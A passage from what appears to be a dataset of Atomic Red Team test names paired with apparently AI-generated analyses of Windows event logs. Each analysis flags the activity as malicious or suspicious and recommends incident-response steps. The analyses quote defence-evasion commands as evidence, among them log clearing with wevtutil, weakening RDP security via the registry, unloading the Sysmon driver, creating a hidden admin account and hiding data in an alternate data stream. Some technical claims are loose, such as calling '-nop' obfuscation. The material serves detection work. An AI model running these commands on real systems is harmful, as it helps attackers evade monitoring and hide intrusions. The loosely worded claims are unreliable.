   - This Event ID is critical as it indicates that the ""Security"" log was cleared, which is typically highly suspicious and aligns with activities to cover tracks.

#### Potential Malicious Activity Indicators:
- The collective use of `wevtutil.exe` to clear logs, commands executed with high privileges, and downloading and executing scripts from a known simulation platform serve as strong indicators of malicious activity.
- The execution of PowerShell scripts with non-standard options further suggests trying to carry out unauthorized or malicious actions while avoiding detection.

### Assessment
Upon analyzing the given event logs, there are clear signs of suspicious and malicious behavior:

1. Multiple uses of system tools to clear event logs (indicating a desire to remove traces of other actions).
2. Execution of potentially harmful scripts from a remote location that is known for testing security defenses.
3. The use of PowerShell with obfuscation techniques (`-nop`) and the lack of direct user activity indicates automated or script-driven activity.
4. Patterns observed are consistent with techniques used during penetration testing or by advanced persistent threats.

### Resolution: **MALICIOUS**

**Guidance:**
- **Immediate Action:** Isolate the affected host from the network to prevent potential lateral movement.

Hidden Window,"Based on the provided Windows event logs, the following analysis can be conducted:

### Summary of Findings:

1. **Security Log:**
   - **Event ID 1102**: The security log was cleared by the user ""admin_test"" on Server002. Clearing of logs is typically an attempt to cover tracks and is often associated with malicious activities, unless there is a legitimate maintenance reason for logging clean-up.
   - **Event ID 4616**: Indicates a time change event, which alone may not signify malicious activity but can be correlated with attempts to confuse time-based log analysis.

2. **Windows PowerShell Log:**
   - **Events with PowerShell Execution (Event ID 600)**: Indicate the execution of potentially suspicious PowerShell commands, specifically the use of `Start-Process` to launch additional PowerShell sessions that aim to run `calc.exe` in a hidden window.
   - Such behavior suggests an attempt to use PowerShell for potentially malicious purposes, given that spawning new processes and particularly calculator applications to establish persistence or a test for privilege execution is a common tactic used by attackers.

3. **Sysmon Log:**
   - **Event ID 1 and 5**: Frequent execution of `wevtutil.exe` by the user ""admin_test"" to clear logs from various channels, including Application, Windows PowerShell, and System. This is suspicious as `wevtutil.exe` is a tool used to manage event logs, and its use here lines up with attempts to erase forensic evidence.
   - PowerShell sessions invoked command lines that initiate `calc.exe`, pairing Sysmon logs with PowerShell logs reinforces potential script-based execution exploiting PowerShell.

4. **System and Application Logs:**
   - The logs show multiple instances of log clearing in the system channel. If not authorized, it confirms malicious intent to hide activity.
   - Normal operation events like timezone updates and system processes didn't show direct evidence of anomalies aside from regular logging activities.

### Assessment:

The logs provided exhibit significant indicators of malicious activity, primarily demonstrated through unauthorized log clearing (Event ID 1102) and the suspicious use of PowerShell to execute additional processes in a manner that obscures operations (`Start-Process -WindowStyle hidden`). The frequent invocation of utilities such as `wevtutil.exe` to clear logs further substantiates attempts to wipe traces of activity which are consistent with tactics used by threat actors to evade detection.

### Resolution: MALICIOUS

**Threat and Risk Assessment:**
- Compromised credentials of ""admin_test"" may have been involved in unauthorized script execution and manipulation of event logs.
- Potential risks include unauthorized data access, modification or exfiltration, and disruption of legitimate services.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected machine (Server002) from the network to prevent further unauthorized access or lateral movement.
   - Conduct a complete credential review and reset passwords for the account ""admin_test"".
   - Capture a full forensic image of the system for in-depth analysis.
  
2. **Further Investigation:**
   - Review access logs and related systems for potential lateral movement indicators.
   - Audit for other compromised accounts.

3. **Preventive Measures:**
   - Implement enhanced PowerShell logging and script block logging.
   - Establish stricter monitoring and alerts for similar activities.
   - Conduct a thorough security awareness refresher with employees about signs of credential phishing and secure practices.

Office 365 - Set Audit Bypass For a Mailbox,"### Log Analysis and Findings

Upon reviewing the provided system, application, security, Sysmon, and PowerShell logs for the Windows host, the following findings have been identified:

#### Suspicious Activity:

1. **Clearing of Event Logs:**
   - **Security Log Event ID 1102:** Indicates that the Security log was cleared. The user ""admin_test"" initiated this action.
   - **System Log Event ID 104:** Indicates that the System and Windows PowerShell logs were also cleared by the same user. 

   Frequent or unauthorized clearing of event logs is a typical tactic used by malicious actors to cover their tracks after gaining unauthorized access or executing suspicious activities. This behavior is a significant red flag and strongly suggests an attempt to hide actions taken on this system.

2. **Use of PowerShell with Potentially Malicious Intent:**
   - **Sysmon Logs:** Multiple instances of PowerShell executions with command lines that are likely suspicious:
     - One instance involves connecting to Exchange Online with credentials and disabling mailbox audit bypass for a specific user. This command (`Set-MailboxAuditBypassAssociation`) can be indicative of attempts to conceal mailbox access activities.
     - Another command checks for installation scripts in system directories which may relate to privilege escalation or system reconnaissance.

3. **Execution of Commands with Elevated Integrity Level:**
   - **Sysmon Logs show processes initiated with High integrity level by the user ""admin_test,""** indicative of administrative privileges being utilized actively during this session. The use of administrative rights, combined with log clearance and suspicious PowerShell activity, suggests malicious intent.

#### Assessment and Resolution

- **Event Log Clearing:** The clearing of various essential logs, especially the Security and System logs by a user account, is a cause for alarm and requires immediate investigation.
  
- **Suspicious PowerShell Scripts:** The execution of PowerShell scripts to modify Exchange mailbox audit settings is highly suspicious and unusual in legitimate user operations.
  
- **Use of Administrative Privileges:** The frequent administrative actions correlated with suspicious script executions underline potential unauthorized access or malicious activity.

Based on the above findings, it is highly likely that the system has experienced a compromise where an attacker attempted to cover tracks by clearing logs and conducted potentially harmful configurations related to email auditing.

Enabling Remote Desktop Protocol via Remote Registry,"### Detailed Analysis:

**Identified Suspicious Activities:**

1. **Log Clearance Events (Event ID 104 and 1102)**:
   - The logs show multiple events where the Windows event logs (System, Security, and Windows PowerShell) were cleared by the user ""admin_test"". Clearing event logs can be indicative of an attempt to erase evidence of malicious activities.

2. **Suspicious Process Executions**:
   - Multiple executions of `wevtutil.exe` for log clearance were observed. This includes clearing logs from the Microsoft-Windows-Sysmon, Application, System, Security, and Windows PowerShell channels.
   - `wevtutil.exe` is a legitimate utility for managing Windows event logs, but its use in this series suggests an attempt to cover up actions that may have been logged.

3. **Registry Modification**:
   - A `cmd.exe` process executed a command to modify the Windows registry to change the RDP Security Layer setting (Event IDs 17985 and 17987). The command `reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f` sets the RDP Security Layer to ""0"", indicating a less secure setting, potentially allowing Man-in-the-Middle attacks over RDP.

**Indicators of Compromise**:
- The clearing of logs is a strong indicator of malicious intent, as it is often used by attackers to evade detection.
- Registry changes diminishing security measures on crucial services such as RDP further highlight potentially malicious intentions.

### Assessment and Resolution:

Based on the analysis of the logs, these activities collectively demonstrate behavior commonly associated with malicious actions:

- The intentional erasing of event logs.
- The disabling of RDP security features through registry amendments.

### Conclusion:

**Resolution: MALICIOUS**

The activities observed in the logs are indicative of an attempt to conceal malicious actions and potentially expose the system to further compromise by reducing security settings. Immediate investigation and mitigation steps should be undertaken to prevent any potential breaches. This includes:
- Verifying the integrity of user accounts involved, particularly ""admin_test"".
- Restoring RDP security settings to a secure state.
- Conducting a broader security audit to identify any external connections or data exfiltration.
- Implementing stricter monitoring and alerts for log clearance and registry modifications."
Create Windows System File with Attrib,"Upon examining the provided Windows event logs, the following notable findings have been identified:

1. **Clearing of Windows Logs**: The Security log (Event ID 1102), System log, and Windows PowerShell log entries indicate clearing of logs initiated by the user ""admin_test"". This behavior is highly suspicious as attackers often clear logs to hide their activity. Legitimate users typically have no reason to clear these logs so regularly or closely together.

2. **Wevtutil.exe Execution**: Sysmon logs reveal that `wevtutil.exe` was executed multiple times by ""admin_test"" to clear various logs, including the Sysmon, Application, System, and Security logs, which correlates with the log clearing events. This further supports the suspicion of malicious activity as it demonstrates explicit intent to remove evidence of actions from the event logs.

3. **Execution of Sensitive Commands**:
   - Commands like `cmd.exe` and `attrib.exe` executed operations resembling known techniques for evasion (i.e., modifying file attributes to hide traces). The command-line arguments used and the presence of temporary files with names referencing MITRE ATT&CK techniques (T1564.001 - Indicator Removal) suggest attempts to obscure activities.

4. **SVCHOST and Service Executions**: Several executed processes are tied to service operations or updates, such as Microsoft Edge Update processes. While not necessarily malicious by themselves, given the context of other suspicious activities, they warrant further extensive review.

**Conclusion**:

The combination of deliberate log clearance, the execution of commands designed to obscure actions, and the timing and sequence of events strongly suggest malicious intent rather than benign legitimate administrative operations. This activity requires immediate and thorough investigation to ascertain the extent of the compromise and mitigate any ongoing threats.

**Resolution: MALICIOUS**.

**Guidance**:
- Isolate the affected system from the network to prevent further actions by the potential attacker.
- Undertake a comprehensive forensic analysis of the system to gather all available evidence.
- Review and reset credentials, especially those of the ""admin_test"" account.
- Implement additional logging and monitoring solutions to detect and prevent similar future activities.
- Plan and conduct a thorough incident response and remediation strategy to secure the environment."
Invoke CHM with InfoTech Storage Protocol Handler,"Upon analyzing the provided logs, the following observations and assessment are made:

### Suspicious and Anomalous Behavior
1. **PowerShell Command Execution**:
   - There is evidence of PowerShell being executed with a specific script `Invoke-ATHCompiledHelp` with unusual parameters like `-InfoTechStorageHandler its`, `-HHFilePath $env:windir\\hh.exe`, and `-CHMFilePath Test.chm`. This could indicate an attempt to leverage PowerShell for potentially malicious purposes.
  
2. **Event Log Clearing**:
   - Events in the **Security** (EventID: 1102) and **System** (EventID: 104) logs show that logs were cleared at suspiciously close times. Log clearing can indicate an attempt to cover tracks following potentially malicious activity.
  
3. **Sysmon Log Activity**:
   - There are multiple instances of `wevtutil.exe` being executed with the ""cl"" (clear) command on various logs such as Sysmon/Operational, Application, and Windows PowerShell. This activity further supports the hypothesis of log manipulation to hide actions taken on the system.

4. **High Integrity Level Processes**:
   - Processes such as `wevtutil.exe` and `taskhostw.exe` are running with a high integrity level, which could be expected in some scenarios but in combination with other events, signals potential misuse.
  
5. **Credential Enumeration Tools**:
   - The use of typical system enumeration tools like `whoami.exe` was noticed. This could be benign but, combined with other suspicious activities, indicates an attempt to ascertain privilege levels or disguise activity under legitimate processes.

### Threats or Risks Identified
- **Privilege Escalation and Log Tampering**: The observed pattern of clearing logs, especially security and system logs, possibly after executing PowerShell scripts, is indicative of malicious intent.
- **Potential Undetected Activities**: Given that logs have been cleared, there could be malicious activities that no longer appear in the logs, suggesting successful stealth operations up to a point.

### Guidance on How to Proceed
1. **Immediate Actions**: 
   - Isolate the host (Server002) from the network to prevent further potential damage or exfiltration of data.
   - Conduct a forensic disk and memory capture to preserve current state for further investigation.
   - Restore cleared logs if possible, using backups or leveraging SIEM solutions to gather missing information.
  
2. **Verification and Monitoring**:
   - Verify integrity of PowerShell scripts and installed software on Server002.
   - Increase monitoring on PowerShell activities and Sysadmin user accounts across the network.
   - Implement stricter access controls and auditing on event log management tools like `wevtutil.exe`.

3. **Incident Response**:
   - Engage your cybersecurity incident response team to analyze the activities and the root cause for this suspicious behavior.
   - Review security patches and ensure Server002 is up-to-date to avoid exploitation of known vulnerabilities.

### Resolution
Based on the observations and analysis:

- **Resolution**: MALICIOUS
- **Rationale**: The combination of executed PowerShell with atypical scripts, clearing of critical system logs, high-integrity level processes, and use of enumeration tools strongly indicate potential malicious activity with evidence of attempts to cover tracks."
office-365-Disable-AntiPhishRule,"Upon reviewing the provided logs, several activities stand out as suspicious or indicative of potential malicious intentions. Here's the detailed analysis:

1. **PowerShell Logs Analysis**:
   - The use of PowerShell scripts in EventRecordIDs `1101`, `1102`, `1103`, `1104`, `1105`, `1106`, `1107`, `1108`, `1109`, and `1110` show an attempt to connect to Exchange Online and disable anti-phishing rules without confirmation. This is a significant red flag indicating an attempt to weaken the security posture of email security by an unauthorized or malicious actor.
   - The use of `ConvertTo-SecureString` and `New-Object System.Management.Automation.PSCredential` hints towards handling credentials, which is often used in scripting automation but warrants investigation due to its context here.

2. **Sysmon Logs Analysis**:
   - Multiple entries involving `wevtutil.exe` are present. This utility is used for clearing event logs (as seen in ProcessId `2740`, `5396`, `6492`, `3544`), which is a common tactic used by attackers to cover their tracks.
   - The image `conhost.exe` usage alongside `wevtutil.exe` suggests manipulation or obfuscation typically employed to conceal log file clearing
   - Additionally, a log entry showing `whoami.exe` usage indicates the user confirmed their current permissions, typically done during lateral movement or privilege escalation.

3. **Security and System Logs Analysis**:
   - There are entries for event logs being cleared in the `Security` and `System` logs by the user `admin_test`, which align with malicious activities aimed at erasing traces of other dangerous actions.

4. **Behavior Summary**:
   - Log clearing events via tools like `wevtutil.exe` and PowerShell scripts attempting to disable security settings without permission indicate strong evidence of malicious activity.
   - Event log evidence points to typical cyberattack behavior, primarily aimed at concealing actions and executing commands designed to compromise system security.

**Assessment and Resolution**:
Given these observations, the collected event logs can be categorized as MALICIOUS due to the presence of explicit actions aimed at disabling security protocols, handling credentials inappropriately, and eliminating traces through log deletion.

**Guidance on how to proceed**:
- Immediately initiate a forensic investigation to determine the extent of the compromise.
- Review and roll back any unauthorized changes to email security policies.
- Change all privileged account credentials, especially those of `admin_test`.
- Enhance monitoring on PowerShell script executions and event log access.
- Conduct a comprehensive security audit and threat hunting on the affected system and the network.
- Evaluate and improve the Distributed System Security to prevent future occurrences.
"
Disable Hypervisor-Enforced Code Integrity (HVCI),"After reviewing the provided logs, a number of suspicious activities have been identified that could indicate potential malicious activity:

1. **Log Clearing Events**: We observe events indicating that logs from the System, Security, and Windows PowerShell channels were cleared. These events are suspicious because an attacker, upon gaining unauthorized access, might clear logs to erase traces of their activity. Specifically, the logs indicate that `wevtutil.exe` was used to clear these logs, a known method in clearing event logs on Windows systems.

2. **Registry Modification with PowerShell**: Multiple `powershell.exe` executions were used to modify the Windows registry, specifically targeting DeviceGuard settings. This could be an attempt to disable security features, potentially for circumventing security mechanisms. The PowerShell script executed adds a DWORD value with `reg.exe`, a legitimate tool often abused in attacks for making unauthorized registry changes.

3. **High-Integrity Level Operations**: The `admin_test` user operates with a high integrity level, commonly linked with elevated permissions. These operations include executing PowerShell scripts and clearing event logs, which under regular circumstances require administrative privileges, thus indicating possible privilege abuse.

4. **Frequent Use of `wevtutil.exe`**: This tool was used repeatedly within a short timeframe to clear logs. Its prevalence in these logs heightens concerns as this isn't typical user behavior but aligns with obfuscation methods post-infiltration.

Given these observations, the behavior recorded in these logs aligns with patterns known in malicious activities, including attempts to conceal attack tracks and tamper with system security configurations. 

### Resolution: MALICIOUS

Based on the events' patterns and characteristics, which reflect known attack behaviors (especially the clearing of event logs and registry modifications using PowerShell), this should be classified as malicious. Immediate steps should be taken to investigate further and contain potential threats. Steps could include:
- Conducting a thorough forensic investigation on the host.
- Isolating the affected system from the network to prevent further malicious activity.
- Reviewing and securing access credentials.
- Analyzing other network endpoints for similar activities, indicating a broader compromise.
- Implementing and enforcing enhanced logging and monitoring to detect future attempts early."
Create Hidden User in Registry,"Based on the provided log entries from the Sysmon, Application, Security, System, and Windows PowerShell logs for the Windows host ""Server002"", here is a detailed analysis:

### Indicators of Malicious Activity:
1. **Sysmon Logs**:
   - The use of `wevtutil.exe` with the command line to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`) by the user `admin_test` indicates potential log tampering, which is a common tactic to cover tracks.
   - The command line execution of `cmd.exe` with parameters to add a new user `AtomicOperator$` with administrative privileges and a command to modify registry keys related to user accounts is highly suspicious. This indicates unauthorized user account creation, a clear sign of an attempted privilege escalation or backdoor establishment.
   - The execution of `whoami.exe` and `hostname.exe` suggests reconnaissance activity.

2. **Security Logs**:
   - An entry indicates that `admin_test` cleared the Security log (Event ID 1102), which is often done to hide malicious activities.
   - Events related to user account creation (`4720`), password setting, user modifications (`4738`), and account enabling (`4722`) for `AtomicOperator$` are significant indicators of malicious activity. 
   - Security group modifications (e.g., Event 4732) suggest unauthorized modifications to user rights or privileges.

3. **System Logs**:
   - Similar tampering activities as seen in `wevtutil.exe` execution clearing the System Event log.
   - System time change events around the time of malicious activity, which can be a strategy to disrupt time-based detection mechanisms.

4. **Application Logs**:
   - Generally less suspicious than the other logs; however, coupled with the other logs, they contribute to the timeline of events, confirming the sequence of actions.

### Assessment:
- **Malicious Activity:** The logs clearly indicate malicious behavior, including the creation of unauthorized accounts, changes to user privileges, and attempts to cover tracks by clearing event logs.
  
### Resolution:
- **MALICIOUS**: The activities captured in these logs are consistent with known attack vectors involving unauthorized access, privilege escalation, and log tampering to hide evidence. Immediate action is needed.

### Recommendations for Action:
1. **Immediate Incident Response**:
   - Isolate ""Server002"" from the network to prevent further malicious activities.
   - Conduct a full forensic investigation of the system to understand the scope and methods of the attack.
   - Review and potentially roll back changes made, such as unauthorized accounts and modified registry settings.

2. **Threat Mitigation**:
   - Reset passwords for any affected or potentially compromised accounts.
   - Implement tighter access controls and monitoring on sensitive operations like event log clearing and user management.
   - Ensure all security patches and updates are applied to prevent exploitation of known vulnerabilities.

3. **Post-Incident Actions**:
   - Review security policies to prevent future incidents.
   - Enhance logging and monitoring capabilities for early detection of similar activities.
   - Educate users on recognizing and reporting suspicious activities.

Given the analysis, the presented evidence strongly supports the classification of the observed behavior as malicious. Immediate efforts should be directed towards containment and remediation."
Disable Windows Registry Tool,"#### Detailed Analysis of the Logs

**Suspicious or Anomalous Behavior:**

1. **Event Log Clearing (EventID: 1102, 104):**
   - The logs show multiple instances of event log clearing via `wevtutil.exe` by the user `admin_test`. Specifically, this user has cleared logs from channels such as Security, System, and Windows PowerShell.
   - While there are legitimate reasons to clear event logs, doing so without proper documentation, especially from sensitive channels like the Security channel, is a common tactic used to cover tracks and indicates potentially malicious activity.

2. **Suspicious Command Execution:**
   - A command was executed (`cmd.exe /c reg add...`) to modify the Windows Registry settings to disable registry tools (EventID: 1 in Sysmon log). This action can be a method to hinder further investigation or prevent system administrators from monitoring or adjusting configurations.
   - The execution of `whoami.exe` and `hostname.exe` is observed. While not inherently suspicious, in the context of the other observed events, it seems to correlate with the user probing for the current environment after potentially unauthorized activities.

3. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is used extensively to manipulate event logs, both for clearing and exporting logs. The pattern of usage and successive clearing of multiple logs suggests an attempt to erase traces of activity systematically.

4. **Time Change Events:**
   - The `EventID: 4616` indicates a system time change. The fact that the time was changed alongside other administrative activities lends to the suspicion of attempts to manipulate timestamps for covering tracks.

**Conclusion and Resolution:**

Given the identified suspicious activities, such as the clearing of critical system logs without any clear legitimate purpose, registry modifications disabling tools critical for system administration, and logs suggesting environmental reconnaissance, these activities align closely with known tactics used during a system compromise. As such, this situation is assessed as:

- **MALICIOUS - Logs contain activity that is confident to be malicious.**

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Disconnect the affected system from the network to prevent further unauthorized access.
   - Perform a memory capture and take an image of the system disk for forensic analysis.

2. **Investigation:**
   - Conduct a full forensic investigation to understand the extent of the compromise.
   - Analyze any retrieved artifacts thoroughly to determine the initial vector of compromise and to identify any persistence mechanisms.

3. **Remediation:**
   - Review and potentially reset all credentials for accounts that have been active on the affected system.
   - Apply any patches and ensure system configurations are in line with security policies.

4. **Strengthening Security Measures:**
   - Strengthen logging and monitoring to detect similar activities in real-time.
   - Implement stricter access controls and auditing for administrative actions. 

5. **Report:**
   - Report the incident to the relevant internal and external authorities to comply with any regulatory standards and to help prevent further incidents within the industry. 

It's recommended to follow up on any broader implications for other systems within the network and ensure updated incident response plans are in place."
System File Copied to Unusual Location,"### Analysis

The logs exhibit several indicators of potentially malicious behavior:

1. **Event Log Clearing:**
   - Security logs show Event ID 1102 for the Microsoft-Windows-Eventlog, indicating that the event logs were cleared by the user `admin_test`. This is a common tactic to cover malicious activities by erasing traces from logs.

2. **Use of PowerShell:**
   - The Sysmon and PowerShell logs show command execution through PowerShell by the user `admin_test`. The command involved copying `cmd.exe` to a location under `C:\ProgramData` and starting it, then stopping the process. This is a suspicious activity as it might indicate an attempt to bypass certain security controls or execute unapproved processes.

3. **Wevtutil.exe Usage:**
   - Multiple instances of `wevtutil.exe` are used to clear logs from various channels (`Microsoft-Windows-Sysmon/Operational`, `System`, `Security`, and `Windows PowerShell`). The use of `wevtutil` to clear event logs is another strong indicator of malicious activity.
   
4. **Credential Access Activity:**
   - Security logs show Event ID 5379 with return code `3221226021`, which implies failed attempts to query user credentials. Even though these could be benign if a misconfiguration is present, combined with the above logs, it suggests an attempt to access credentials improperly.

5. **Execution of Unusual Scripts:**
   - The PowerShell log entries indicate a sequence of operations that involve copying and launching command prompts, potentially suggesting script execution for unauthorized activities.

6. **SystemLevel Execution in Edge Update Context:**
    - There are multiple Sysmon entries for Microsoft Edge Update which appear normal, suggesting software updates, but they should be reviewed to ensure these activities are scheduled and authorized in your environment.

### Assessment

The combination of log clearing events, PowerShell script execution, suspicious command line usage, and failed credential access attempts creates a strong suspicion of malicious activity. These activities typically align with behaviors observed during post-exploitation phases of an attack, where the adversary seeks to escalate privileges, cover tracks, or execute payloads.

### Resolution

Based on the analysis, the conclusion is:

**MALICIOUS** - The logs contain several strong indicators of malicious activity, including event log clearing, suspicious PowerShell use, credential access attempts, and atypical process executions.

### Guidance

1. **Immediate Actions:**
   - Isolate the host (`Server002`) to prevent potential lateral movement or exfiltration of information.
   - Preserve full forensic copies of the logs and the entire system for further investigation.

2. **Investigation:**
   - Conduct a deeper forensic analysis to identify any unauthorized changes or potential persistence mechanisms left by an attacker.
   - Review network logs and endpoints for any lateral or outward connections during this timeframe.

3. **Remediation:**
   - Reset credentials and accounts for any potentially impacted users, particularly 'admin_test'.
   - Apply relevant security patches and consider implementing tighter security configurations, including PowerShell script execution monitoring and auditing.

4. **Post-Incident Activity:**
   - Enhance logging and monitoring capabilities to better detect such actions in the future.
   - Conduct a thorough review of systems and user permissions to minimize the risk of future occurrences."
attrib - hide file,"Upon analyzing the provided logs, several key events stand out, indicating potentially suspicious activity:

1. **Event Log Clearance**: 
   - Multiple events (Security log EventID 1102, System log EventID 104) indicate that logs have been cleared. This action, especially from a non-standard admin account (`admin_test`), can be an indicator of an attempt to hide malicious activity as clearing logs is often used by attackers to cover their tracks.

2. **Unusual Process Executions**:
   - Several executions of seemingly benign utilities (e.g., `whoami.exe`, `hostname.exe`, `cmd.exe`) with high integrity and from an administrative context (`High` Integrity Level) under the `admin_test` user. This user appears to be testing or preparing something with administrative rights. 
   - Usage of `cmd.exe` to conduct file operations and hide files (e.g., using `attrib.exe +h` to hide files under `Temp` directory) in Sysmon logs. The specific command used in Event ID 18007 suggests some form of automated script or potential data exfiltration preparation.

3. **Frequent Use of `wevtutil.exe`**:
   - The tool `wevtutil.exe` is used to clear various event logs, including Sysmon, Application, and Security logs. This further reinforces the likelihood of an attempt to remove traces of certain activities.

4. **Pattern of `wsmprovhost.exe` as Parent Process**:
   - Many processes have `wsmprovhost.exe` as the parent process. While there isn't enough context within these logs to definitively determine its nature, `wsmprovhost.exe` in these scenarios might be indicative of remote management activity, potentially meaningful if carried out without legitimate purpose, especially paired with log clearance.

5. **`cmd.exe` and Directory/File Manipulation**:
   - The `cmd.exe` execution path in EventRecordID 18007 involves creating directories and manipulating file attributes. The purpose behind hiding files is often to evade detection, which aligns with behaviors observed in malicious scripts.

Given the indicators above, the assessment is as follows:

- **Assessment**: The logs show multiple signs of potentially malicious behavior, particularly the log clearance actions, which alone spotlight an attempt to hide some activities. Additionally, given the use of administrative privileges, possible scripting or automation with `cmd.exe` doing complex tasks, and frequent executions of tools used to clear logs under the same administrative context, it's clear these actions warrant suspicion.

- **Resolution**: **SUSPICIOUS**

To proceed, I would recommend a detailed investigation into the `admin_test` account's actions, examine for any persistence mechanisms installed, and look into network traffic from the system for any signs of external communications or data exfiltration. Moreover, an integrity check of the system and a review of access permissions for key files and directories should be conducted as precautionary measures."
Store file in Alternate Data Stream (ADS),"### Analysis of Windows Event Logs:

Upon reviewing the provided logs, several indicators suggest potentially malicious activity that should be investigated further. The following are key observations:

1. **Clearing of Event Logs:**
   - Multiple instances of the `wevtutil.exe` command line utility were used to clear event logs (Sysmon EventID 1 and EventID 5):
     - `CommandLine=""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - `CommandLine=""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - `CommandLine=""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
   - Event clearing was noted in the System Log (EventID 104) and Security Log (EventID 1102), both performed by the user `admin_test`.
   - Clearing of logs is a common tactic used by attackers to cover their tracks, making these actions highly suspicious.

2. **Suspicious PowerShell Activity:**
   - PowerShell logs show execution of a script with potentially harmful intent:
     - `HostApplication=powershell.exe & {if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki}, Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,c:\\windows\\system32\\cmd.exe,>,`""C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:desktop.ini`\""\""}`
   - This PowerShell script includes unusual use of file streams and directories, which may be used for persistence mechanisms or data exfiltration.

3. **Command Execution via Command Prompt:**
   - Execution of commands via `cmd.exe` is observed from the PowerShell script, with use of a file stream redirection (EventID 4516):
     - `CommandLine=""\""C:\\Windows\\system32\\cmd.exe\"" /c,type,c:\\windows\\system32\\cmd.exe,>,\""C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:desktop.ini\""""`

4. **Alteration of System Time:**
   - System logs indicate alterations in system time (EventID 4616), which can be an attempt to confuse log entries or timestamps on files.

5. **Unusual Usage Patterns:**
   - Use of both `wevtutil.exe` and `conhost.exe` around the same time by `admin_test` in high integrity contexts is suspicious and unusual.

### Assessment and Resolution:
Given the combination of cleared logs, suspicious PowerShell scripts, and system time alterations, there is a reasonable indication of malicious activity.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Incident Response:** Initiate a full incident response to understand the extent of the compromise. This should include isolating the affected system to prevent further actions by the attacker.
- **Audit and Review:** Conduct a comprehensive review of user `admin_test` activities and permissions, as well as an audit trail of system changes and events around the provided timestamps.
- **Forensic Analysis:** Perform forensic imaging and analysis of the affected system to retrieve residual traces and understand the attack vector.
- **Enhance Monitoring:** Increase monitoring of `wevtutil.exe` and PowerShell activities across other systems to detect similar patterns quickly.
- **Patch and Security Updates:** Ensure all systems have the latest security patches and updates applied.

These measures should help in mitigating the threat and preventing further incidents."
Lolbin Gpscript logon option,"Upon analyzing the provided Windows event logs, several points of interest and potential indicators of malicious activity can be observed:

1. **Clearing of Event Logs:**
   - The security log contains an event (EventID: 1102) indicating that the logs were cleared by the user `admin_test`. The Sysmon log similarly shows multiple events involving the `wevtutil.exe` process, which is a utility used to manage event logs, being executed by the `admin_test` user.
   - Additional logs were cleared in the System log, with EventID 104 showing clearing across various channels including System and Windows PowerShell, all triggered by the same user.

2. **Use of `wevtutil.exe`:**
   - There are a number of Sysmon events detailing the execution of `wevtutil.exe` with the `cl` command, which is used to clear logs, on multiple logging channels such as Security, System, and Windows PowerShell. This sequence aligns with the observation of log clearing events.

3. **High Integrity Level for Log Clearing:**
   - The integrity level of the `wevtutil.exe` process is high, indicating that it was executed with elevated privileges, normally requiring administrator-level access.

4. **Suspicious Command Line Execution:**
   - Execution of `cmd.exe` with `Gpscript /logon`. While not inherently malicious, the context and timing alongside the clearing of logs could indicate efforts to cover tracks or execute unauthorized scripts.

5. **Time Synchronization Events:**
   - There are events relating to time change (EventID: 4616), where the time was set almost immediately after the logs were cleared. This could be an attempt to alter timestamps of subsequent logs to obfuscate the timeline of events.

6. **Service and Scheduled Tasks:**
   - Several processes related to Microsoft Edge Update activities were logged, indicating regular update checks and installations. While these activities typically are not suspicious, their timing and parallel execution to potential malicious activities warrant correlation analysis but do not provide conclusive evidence without any indicators of compromise on Edge-related processes.

Based on the review of the logs, the clearing of multiple logs in rapid succession and execution of `wevtutil.exe` with elevated privileges are strong indicators of potentially malicious behavior intended to evade detection or investigation:

- The act of clearing logs itself, especially without any known legitimate operational need, is often considered an indicia of malicious intent.
- The coordination of these events around standard system tasks like time synchronization adds to the suspicion.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
- Immediate action should be taken to perform a full security audit on the involved machine (`Server002`), including forensic analysis of disk and memory to identify potential malware or unauthorized access.
- The credentials of the user `admin_test` should be considered compromised until verified otherwise, and password resets or account suspensions should be implemented.
- Monitoring should be put in place across similar hosts within the network to detect similar activities, ensuring configurations prevent unauthorized log manipulations.
- A review of account permissions and usage of high-privileged accounts should be conducted to close any gaps that may allow for similar activities in the future."
Unload Sysmon Filter Driver,"### Analysis of Windows Event Logs

**1. Overview:**
The logs provided are from a Windows system identified as ""Server002"" and involve the Security, System, and Sysmon channels. Key areas of focus are suspicious process executions, misuse of command-line utilities, and any anomalous activities indicating potential compromise.

**2. Key Observations:**

- **Event Log Clearing:**
  - **Events 104:** In both System and Windows PowerShell logs, there are records of event log clearing by the user ""admin_test."" This action can often indicate an attempt to cover tracks after potential malicious actions. These were performed at `08:05:12`, synchronized with other activities, suggesting deliberate log clearing.

- **Unloading of Sysmon Driver:**
  - **Events 18005 and 255:** Sysmon driver (SysmonDrv) was unloaded by executing the `cmd.exe` command `/c fltmc.exe unload SysmonDrv` at `08:05:21`. This is considered suspicious because it indicates a potential attempt to disable Sysmon monitoring capabilities, a known tactic of attackers to evade detection.

- **Execution of `wevtutil` to Clear Logs:**
  - Multiple `wevtutil cl` commands targeting Sysmon, System, Application, Security, and Windows PowerShell logs were detected sequentially, linked to the user ""SERVER002\\admin_test."" This behavior is highly suspicious as it aligns with potential log tampering usually performed to erase traces of unauthorized activities.

- **Time Change Events:**
  - **Event ID 4616 in Security Logs:** These reflect minor time adjustments, often routine. While the time setting changes observed might align with routine time synchronization, the timing coincided with other suspicious activities, indicating possible log manipulation.

**3. Assessment and Risk:**
- **Indicators of Malicious Activity:**
  - The combination of log clearance, unloading of SysmonDrv, and multiple `wevtutil cl` commands suggests the system may have been compromised or subjected to actions attempting to obscure unauthorized activities.

**4. Resolution:**
- **Resolution: MALICIOUS**

**5. Recommendations:**
- **Immediate Actions:**
  - Temporarily isolate the affected machine (Server002) from the network to prevent any further potential malicious activities.
  - Investigate the account used for these actions (admin_test) for unauthorized access or misuse.
  - Restore any cleared logs from Backups, if available, to analyze prior actions.

- **Post-Incident Steps:**
